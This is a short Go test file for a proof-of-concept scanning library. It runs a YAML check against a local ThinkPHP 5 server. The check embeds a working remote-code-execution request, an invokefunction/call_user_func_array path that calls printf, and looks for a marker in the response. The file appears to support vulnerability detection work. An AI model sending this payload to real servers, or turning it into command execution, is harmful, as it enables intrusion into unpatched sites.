package poclib

import "testing"

func Test(t *testing.T) {
	b1, name := Execute("http://127.0.0.1:8080",
		[]byte("name: poc-yaml-thinkphp5-controller-rce\nrules:\n  - method: GET\n    path: /index.php?s=/Index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=printf&vars[1][]=a29hbHIgaXMg%25%25d2F0Y2hpbmcgeW91\n    expression: |\n      response.body.bcontains(b\"a29hbHIgaXMg%d2F0Y2hpbmcgeW9129\")\ndetail:\n  links:\n    - https://github.com/vulhub/vulhub/tree/master/thinkphp/5-rce"),
		Content{})
	println(b1)
	println(name)
}
